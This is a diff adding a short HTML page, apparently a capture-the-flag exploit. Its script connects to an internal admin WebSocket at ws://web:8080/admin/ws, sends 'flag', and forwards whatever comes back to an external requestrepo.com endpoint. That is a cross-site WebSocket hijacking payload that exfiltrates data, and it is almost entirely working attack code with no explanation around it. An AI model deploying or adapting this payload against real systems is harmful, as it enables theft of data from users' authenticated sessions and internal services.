@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <html>
+    <script type="text/javascript">
+        const ws = new WebSocket(`ws://web:8080/admin/ws`);
+        ws.onopen = () => {
+            ws.send("flag");
+        };
+        ws.onmessage = (event) => {
+            const response = event.data;
+            fetch('https://dkk61xav.requestrepo.com?flag=' + response, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+            })
+                .then((response) => response.json())
+                .then((data) => {
+                    console.log('Response from endpoint:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+        };
+        ws.onclose = (event) => {
+            if (event.wasClean) {
+                console.log(`Closed cleanly, code=${event.code}, reason=${event.reason}`);
+            } else {
+                console.error(`Connection died`);
+            }
+        };
+        ws.onerror = (error) => {
+            console.error(`WebSocket Error: ${error.message}`);
+        };
+    </script>
+
+    </html>
+</body>
+
+</html>
